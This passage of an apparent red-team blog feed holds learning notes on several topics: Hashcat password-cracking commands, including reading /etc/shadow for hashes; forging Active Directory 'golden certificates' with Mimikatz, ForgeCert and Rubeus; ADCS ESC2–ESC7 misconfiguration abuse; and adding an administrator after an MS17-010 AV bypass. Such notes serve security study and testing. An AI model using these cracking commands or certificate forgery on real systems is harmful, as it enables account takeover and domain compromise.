src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Bypass%20Attack/image-20210906142716710.png"></p><h3 id="Add-user"><a href="#Add-user" class="headerlink" title="Add user"></a>Add user</h3><pre class="line-numbers language-none"><code class="language-none">A long time ago, there was 17010 in the environment in 2016, but it was not successful. At that time, I thought maybe there was a kill soft, now through this method, you can also bypass AV, like me, directly add an administrator user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Bypass%20Attack/image-20210906172737027.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> MS17010 </tag>
            
            <tag> ETERNALCHAMPION </tag>
            
            <tag> ETERNALROMANCE </tag>
            
            <tag> ETERNALSYNERGY </tag>
            
            <tag> ETERNALBLUE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hashcat Blasting Method</title>
      <link href="2021/09/04/hashcat-blasting-method/"/>
      <url>2021/09/04/hashcat-blasting-method/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Hashcat claims to be the world&#39;s fastest password recovery tool. It had a proprietary code base until 2015, but is now released as free software. Versions for Linux, OS X, and Windows can use CPU-based or GPU-based variants. Hash algorithms that support Hashcat include Microsoft LM hash, MD4, MD5, SHA series, Unix encryption format, MySQL and Cisco PIXgithub add：https:&#x2F;&#x2F;github.com&#x2F;hashcat&#x2F;hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Basic-parameters"><a href="#Basic-parameters" class="headerlink" title="Basic parameters"></a>Basic parameters</h3><pre class="line-numbers language-none"><code class="language-none">-r      使用自定义破解规则-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。-m  指定要破解的hash类型，如果不指定类型，则默认是MD5-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项--show  显示已经破解的hash及该hash所对应的明文--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用--increment-max 密码最大长度,同上--outfile-format 指定破解结果的输出格式id,默认是3--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到--remove     删除已被破解成功的hash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="a-Attack-mode"><a href="#a-Attack-mode" class="headerlink" title="-a Attack mode"></a>-a Attack mode</h4><pre class="line-numbers language-none"><code class="language-none">0 | Straight（字段破解）1 | Combination（组合破解）3 | Brute-force（掩码暴力破解）6 | Hybrid Wordlist + Mask（字典+掩码破解）7 | Hybrid Mask + Wordlist（掩码+字典破解<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="D-Choose-your-CPU-type"><a href="#D-Choose-your-CPU-type" class="headerlink" title="-D Choose your CPU type"></a>-D Choose your CPU type</h4><pre class="line-numbers language-none"><code class="language-none">1 | CPU2 | GPU3 | FPGA, DSP, Co-Processor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="OUTput"><a href="#OUTput" class="headerlink" title="OUTput"></a>OUTput</h4><pre class="line-numbers language-none"><code class="language-none">1 &#x3D; hash[:salt]2 &#x3D; plain3 &#x3D; hash[:salt]:plain4 &#x3D; hex_plain5 &#x3D; hash[:salt]:hex_plain6 &#x3D; plain:hex_plain7 &#x3D; hash[:salt]:plain:hex_plain8 &#x3D; crackpos9 &#x3D; hash[:salt]:crackpos10 &#x3D; plain:crackpos11 &#x3D; hash[:salt]:plain:crackpos12 &#x3D; hex_plain:crackpos13 &#x3D; hash[:salt]:hex_plain:crackpos14 &#x3D; plain:hex_plain:crackpos15 &#x3D; hash[:salt]:plain:hex_plain:crackpos<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Mask-set"><a href="#Mask-set" class="headerlink" title="Mask set"></a>Mask set</h4><pre class="line-numbers language-none"><code class="language-none">l | abcdefghijklmnopqrstuvwxyz          纯小写字母u | ABCDEFGHIJKLMNOPQRSTUVWXYZ          纯大写字母d | 0123456789                  纯数字h | 0123456789abcdef                小写字母和数字H | 0123456789ABCDEF                   大写字母和数字s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~   特殊字符a | ?l?u?d?s                    键盘上所有可见的字符b | 0x00 - 0xff                 匹配空格密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Basic-case"><a href="#Basic-case" class="headerlink" title="Basic case"></a>Basic case</h5><pre class="line-numbers language-none"><code class="language-none">八位数字密码：?d?d?d?d?d?d?d?d八位未知密码：?a?a?a?a?a?a?a?a前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h另外--custom-charset1 [chars]等价于 -1--custom-charset2 [chars]等价于 -2--custom-charset3 [chars]等价于 -3--custom-charset4 [chars]等价于 -4在掩码中用?1、?2、?3、?4来表示，意思就是说--custom-charset1 yangsir1234567890  可以直接用?1来表示--custom-charset2 ?d?d 可以直接用?2来表示-1 ?d?l?u  ?1就表示大小写字母+数字-3 qaz -4 123456  ?3?3?3?3?4?4?4?4就表示前面四位可能是qaz后面四位可能是123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Common-cracking-cases"><a href="#Common-cracking-cases" class="headerlink" title="Common cracking cases"></a>Common cracking cases</h3><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><pre class="line-numbers language-none"><code class="language-none">8位数字hashcat -a 3 --force ac57c8b0fd67b6083a4d9851d6f6659b ?d?d?d?d?d?d?d?d4小写+数字hashcat -a 3 --force 1e6041b9b99ba99d14982a0c17a22ca9 -1 ?l?d ?1?1?1?11-8小写字母+数字hashcat -a 3 -m 0 -D 1 --force 1e6041b9b99ba99d14982a0c17a22ca9 --increment --increment-min 1 --increment-max 8 ?h?h?h?h?h?h?h?h指定字符串hashcat -a 3 -1 12345abc a906449d5769fa7361d7ecc6aa3f6d28 ?1?1?1?1?1?1字典破解hashcat -a 0 a906449d5769fa7361d7ecc6aa3f6d28 password.txt字典批量破解hashcat -a 0 tarhash.txt password.txt多字典组合hashcat -a 1 a906449d5769fa7361d7ecc6aa3f6d28 password1.txt password2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><pre class="line-numbers language-none"><code class="language-none">select authentication_string from mysql.user; 可得hashhashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="sha512crypt-6-SHA512-Unix"><a href="#sha512crypt-6-SHA512-Unix" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)"></a>sha512crypt $6$, SHA512 (Unix)</h4><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;shadow 可获取hashcat -a 3 -m 1800 --force &#39;$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew&#x2F;xd0O0hPG&#x2F;yrm2X.&#39; ?l?l?l?l不删除用户名hashcat -a 3 -m 1800 --force &#39;qiyou:$6$QDq75ki3$jsKm7qTDHz&#x2F;xBob0kF1Lp170Cgg0i5Tslf3JW&#x2F;sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1&#39; ?l?l?l?l?l --username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h4><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="NETNTLM"><a href="#NETNTLM" class="headerlink" title="NETNTLM"></a>NETNTLM</h4><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 5500 xxx.wang::::3ab413d5b170c792b5dc00cc8d95349c0bbxxxxxx2e42:xxxx04e957f0cf -1 ?l?u   ?1?1?1?1?d?d?d?d  --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Other-note"><a href="#Other-note" class="headerlink" title="Other note"></a>Other note</h2><pre class="line-numbers language-none"><code class="language-none">如果已经破解了的，hashcat hash --show 查看节课cat ~&#x2F;.hashcat&#x2F;hashcat.potfile   查看破解结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Hashcat%20Blasting%20Method/h.png"></p><pre class="line-numbers language-none"><code class="language-none">使用GPU模式进行破解时，-O参数自动进行优化--gpu-accel 160 让GPU发挥最大性能--gpu-loops 1024 让GPU发挥最大性能--segment-size 512 提高大字典爆破速度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hashcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ADCS&amp;DomainGoldenCertificate</title>
      <link href="2021/09/02/adcs-domaingoldencertificate/"/>
      <url>2021/09/02/adcs-domaingoldencertificate/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Most of the time domain set branch of CA and AD authentication system, using the CA certificate issued by the root certificate of the new private key to sign, if an attacker can get the private key, so long to do fake certificates, thus as anyone (without smart card) to the AD for authentication, which is the source of the gold certificateTo use CERTificates for authentication, the CA must issue an EKUOID certificate containing a certificate that allows domain authentication to the target account. When an account uses CERTificates for authentication, AD authenticates the CA certificate specified by the certificate chain object at the root CA and NT AUTH CERTificates<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902163714077.png"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">Certificates are stored on the CA server. If TPM&#x2F;HSM is not domain-based hardware protected, its private key is protected by machineDPAPI. If the key is not hardware protected, MimiKatz and SharPDpapi can extract CA certificates and private keys from the CAYou can export the target certificate and key as follows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902135451487.png"></p><pre class="line-numbers language-none"><code class="language-none">Set your pass like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902135521854.png"></p><pre class="line-numbers language-none"><code class="language-none">You will get your cert like this <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902135601288.png"></p><pre class="line-numbers language-none"><code class="language-none">Also you can use the mimikatz to get the cert <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902151506151.png"></p><pre class="line-numbers language-none"><code class="language-none">Use the common domain machine to inputh the cert <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902151726880.png"></p><pre class="line-numbers language-none"><code class="language-none">Confirm your cert <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902152611438.png"></p><pre class="line-numbers language-none"><code class="language-none">Now you can fake anyone&#39;s cert to use the forgecert <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902154110464.png"></p><pre class="line-numbers language-none"><code class="language-none">Input the fake cert like this <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902162800266.png"></p><pre class="line-numbers language-none"><code class="language-none">I think you must be know how to attack againSuch as use the rubeus to askTGT , in addition, because there is no normal issuance process, so it is said that the forged certificate can not be revoked, and the CA server will not find the forged certificate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902165555214.png"></p><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><pre class="line-numbers language-none"><code class="language-none">The process of forging a certificate can be forged on a controlled hostThe target user specified when forging the certificate needs to be active&#x2F;enabled in the AD and able to authenticate, as the authentication exchange will still take place as that user. For example, trying to forge KRBTGT&#39;s certificate will not doThis forged certificate will remain valid until the specified end date (in this case, a year) and as long as the root CA certificate is valid (certificates typically start at 5 years, but are often extended to more than 10 years). This abuse is not limited to ordinary user accounts but also applies to machine accounts.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Some-supplement"><a href="#Some-supplement" class="headerlink" title="Some supplement"></a>Some supplement</h3><h4 id="Progress-to-obtain-certificates-that-have-been-issued"><a href="#Progress-to-obtain-certificates-that-have-been-issued" class="headerlink" title="Progress to obtain certificates that have been issued"></a>Progress to obtain certificates that have been issued</h4><pre class="line-numbers language-none"><code class="language-none">Get-CertRequest | Export-CSV -NoTypeInformation r.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902133449084.png"></p><pre class="line-numbers language-none"><code class="language-none">The excel like this <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26DomainGoldenCertificate/image-20210902133521553.png"></p><h4 id="Progress-revokes-issued-certificates"><a href="#Progress-revokes-issued-certificates" class="headerlink" title="Progress revokes issued certificates"></a>Progress revokes issued certificates</h4><pre class="line-numbers language-none"><code class="language-none">Get-CertificationAuthority &lt;CAName&gt; | Get-IssuedRequest -RequestID &lt;X&gt; | Revoke-Certificate -Reason &quot;KeyCompromise&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Domain Environment </tag>
            
            <tag> Golden Certificate </tag>
            
            <tag> PTT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ADCS&amp;ESC2-7Attack</title>
      <link href="2021/09/01/adcs-esc2-7attack/"/>
      <url>2021/09/01/adcs-esc2-7attack/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">关于最基本的一些知识点、ESC1、ESC8的攻击方式，请看我先前写的文章https:&#x2F;&#x2F;yangsirrr.github.io&#x2F;2021&#x2F;08&#x2F;16&#x2F;adcs-esc1-esc8-gong-ji-fang-shi&#x2F;这里为技术点的进步补充，主要是ESC2-7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ESC2-配置错误的证书模板"><a href="#ESC2-配置错误的证书模板" class="headerlink" title="ESC2-配置错误的证书模板"></a>ESC2-配置错误的证书模板</h2><pre class="line-numbers language-none"><code class="language-none">攻击者可以使用带有任何目的的EKU功能证书，进行客户端、服务端的身份验证，也可以使用无EKUs的证书来进行任何目的，或签署新的证书因此使用从属CA证书，攻击者能够指定新证书中的任意EKUs或字段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="配置问题"><a href="#配置问题" class="headerlink" title="配置问题"></a>配置问题</h3><pre class="line-numbers language-none"><code class="language-none">1、允许低权限用户注册，和ESC1相同2、管理员审批禁用，和ESC1相同3、不需要授权的前面，和ESC1相同4、过于宽松的证书模板授权低权限用户注册5、证书模板定义了任何的EKUS或无EKU基本大体都是和ESC1一样的，部分区别如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210831095306456.png"></p><h3 id="检测情况"><a href="#检测情况" class="headerlink" title="检测情况"></a>检测情况</h3><pre class="line-numbers language-none"><code class="language-none">公开工具能够检测确认漏洞存在如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210831095835323.png"></p><pre class="line-numbers language-none"><code class="language-none">同ESC1相同方式申请证书即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210831095726671.png"></p><pre class="line-numbers language-none"><code class="language-none">确认获得证书如下，具体如何利用请看ESC1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210831095213107.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210831095642587.png"></p><h2 id="ESC3-注册代理模板"><a href="#ESC3-注册代理模板" class="headerlink" title="ESC3-注册代理模板"></a>ESC3-注册代理模板</h2><pre class="line-numbers language-none"><code class="language-none">证书请求代理EKU允许委托人代表其他用户申请证书，对于任何注册此模板的用户，生成的证书可用于代表任何用户共同签署部署请求<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="配置问题-1"><a href="#配置问题-1" class="headerlink" title="配置问题"></a>配置问题</h3><pre class="line-numbers language-none"><code class="language-none">1、允许低权限用户注册，和ESC1相同2、管理员审批禁用，和ESC1相同3、不需要授权的前面，和ESC1相同4、过于宽松的证书模板授权低权限用户注册5、证书模板定义了证书请求代理EKU，证书请求代理允许代表其他主题请求其他证书目标6、没有在CA上实现登记代理限制基本同ESC1相似，不同点在于证书申请代理处<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="检测情况-1"><a href="#检测情况-1" class="headerlink" title="检测情况"></a>检测情况</h3><pre class="line-numbers language-none"><code class="language-none">可检测ESC3存在如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210831100720880.png"></p><pre class="line-numbers language-none"><code class="language-none">代理注册流程的官方文档：https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-cersod&#x2F;97f47d4c-2901-41fa-9616-96b94e1b5435最直接申请administrator证书<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210831102412514.png"></p><h2 id="ESC4-证书模板访问控制"><a href="#ESC4-证书模板访问控制" class="headerlink" title="ESC4-证书模板访问控制"></a>ESC4-证书模板访问控制</h2><pre class="line-numbers language-none"><code class="language-none">证书模板是 Active Directory 中的安全对象，这意味着它们具有安全描述符，用于指定哪些 Active Directory 主体对模板具有特定权限。如果允许意外或非特权的委托人编辑安全设置，则模板将被视为访问控制级别上的配置问题，攻击者具备写入、完全控制权限，能够将错误的配置推到模板，比如直接把模板设置为ECS1-3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="检测情况-2"><a href="#检测情况-2" class="headerlink" title="检测情况"></a>检测情况</h3><pre class="line-numbers language-none"><code class="language-none">公开工具能够检测并确认漏洞存在如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210831104304270.png"></p><pre class="line-numbers language-none"><code class="language-none">概念验证，详情可通过该工具实现 https:&#x2F;&#x2F;github.com&#x2F;cfalta&#x2F;PoshADCS，基于github的这个demo利用来说感觉价值不高....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210831120246895.png"></p><h2 id="ECS5-PKI访问控制"><a href="#ECS5-PKI访问控制" class="headerlink" title="ECS5-PKI访问控制"></a>ECS5-PKI访问控制</h2><pre class="line-numbers language-none"><code class="language-none">证书模板和证书颁发机构本身之外的许多对象可能会对整个ADCS系统产生安全影响，如果控制如下一个将影响整个PKI包括但不限于：CA服务器的AD计算机对象（即通过 RBCD 攻陷）CA服务器的RPC&#x2F;DCOM服务器PKI相关的AD对象。容器中的任何后代AD对象或容器CN&#x3D;Public Key Services,CN&#x3D;Services,CN&#x3D;Configuration,DC&#x3D;,DC&#x3D;  （例如，证书模板容器、证书颁发机构容器、NTAuthCertificates 对象等）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="检测情况-3"><a href="#检测情况-3" class="headerlink" title="检测情况"></a>检测情况</h3><pre class="line-numbers language-none"><code class="language-none">这个配置范围非常大，所以检测工具没有检测ECS5的能力，基本CA服务器的RPC&#x2F;DCOM服务器安全性需要手工分析获取相关控制编辑权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210901131024306.png"></p><pre class="line-numbers language-none"><code class="language-none">domian users能够对相关模板重新编辑，从而影响发布的证书服务应用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210901140325505.png"></p><h2 id="ESC6-EDITF-ATTRIBUTESUBJECTALTNAME2"><a href="#ESC6-EDITF-ATTRIBUTESUBJECTALTNAME2" class="headerlink" title="ESC6-EDITF_ATTRIBUTESUBJECTALTNAME2"></a>ESC6-EDITF_ATTRIBUTESUBJECTALTNAME2</h2><pre class="line-numbers language-none"><code class="language-none">如果在证书颁发机构的配置中启用了EDITF_ATTRIBUTESUBJECTALTNAME2标志，则任何证书请求都可以指定任意主题备用名称 (SAN)。这意味着为域身份验证配置的任何模板也允许非特权用户注册（例如，默认用户模板）可能会被滥用以获取允许我们作为域管理员（或任何其他活动用户&#x2F;机器）进行身份验证的证书<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="检测情况-4"><a href="#检测情况-4" class="headerlink" title="检测情况"></a>检测情况</h2><pre class="line-numbers language-none"><code class="language-none">公开工具能够检测并确认漏洞存在如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210901153831299.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210901154006032.png"></p><pre class="line-numbers language-none"><code class="language-none">修复的话对应关闭EDITF_ATTRIBUTESUBJECTALTNAME2即可certutil –setreg policy\EditFlags –EDITF_ATTRIBUTESUBJECTALTNAME2进步利用直接看这个就行了https:&#x2F;&#x2F;www.keyfactor.com&#x2F;blog&#x2F;hidden-dangers-certificate-subject-alternative-names-sans&#x2F;其他参考https:&#x2F;&#x2F;cqureacademy.com&#x2F;blog&#x2F;enhanced-key-usagehttps:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;previous-versions&#x2F;windows&#x2F;it-pro&#x2F;windows-server-2012-R2-and-2012&#x2F;dn786426(v&#x3D;ws.11)#controlling-user-added-subject-alternative-names<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ESC7-证书颁发机构访问控制"><a href="#ESC7-证书颁发机构访问控制" class="headerlink" title="ESC7-证书颁发机构访问控制"></a>ESC7-证书颁发机构访问控制</h2><pre class="line-numbers language-none"><code class="language-none">除了证书模板外，证书颁发机构本身剧本一组保护各类CA操作的权限，如下两种权限最为危险ManageCA：ca admin，允许管理CA操作，包括(远程)配置ESC6-EDITF_ATTRIBUTESUBJECTALTNAME2，将直接导致ESC6ManageCertificates：cert admin，允许主体批准悬而未决的证书请求，从而否定manager颁发的保护要求<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置问题-2"><a href="#配置问题-2" class="headerlink" title="配置问题"></a>配置问题</h3><pre class="line-numbers language-none"><code class="language-none">证书颁发机构配置相关权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210901163944644.png"></p><h3 id="检测情况-5"><a href="#检测情况-5" class="headerlink" title="检测情况"></a>检测情况</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC2-7Attack/image-20210901163037749.png"></p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><pre class="line-numbers language-none"><code class="language-none">总得来说，想打adcs周边还是得大环境，大域里边容易碰到，小域小环境可能都不会有cs，更不用说打权限了，其次主流使用还是1、8为主，这里个人学习琢磨的2-7可以说是个知识点的补充<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Domain Environment </tag>
            
            <tag> PTT </tag>
            
            <tag> DPE </tag>
            
            <tag> ADCS </tag>
            
            <tag> ESC2 </tag>
            
            <tag> ESC3 </tag>
            
            <tag> ESC4 </tag>
            
            <tag> ESC5 </tag>
            
            <tag> ESC6 </tag>
            
            <tag> ESC7 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discovery of multiple logic vulnerabilities in a project</title>
      <link href="2021/08/29/discovery-of-multiple-logic-vulnerabilities-in-a-project/"/>
      <url>2021/08/29/discovery-of-multiple-logic-vulnerabilities-in-a-project/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">All cases are authorized legal compliance projects. Do not carry out any penetration attacks without authorization. Please abide by the network security law Last year dug a mall a number of vulnerabilities, time has passed more than a year, take out to share some basic operations.I&#39;m just going to put in some interesting logic holes here, sensitive information is desensitized.Logic can be found mainly in the familiar with the target function of the vulnerability of the cases, observation data packets, careful observation and bold attempt to change package, finally in fact there is a problem or can be found, this mainly by the recent discovery of logical loopholes case to make a review, this article related the packet has thick code processing, if the bosses read causing inconvenience locations.The target is a shopping mall, commodity selection, ordering, payment, the whole process function is very perfect, basically is also complete, the website also has WAF, therefore, at that time, the final discovery of the loophole mainly logic loophole.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-Found"><a href="#Actual-Found" 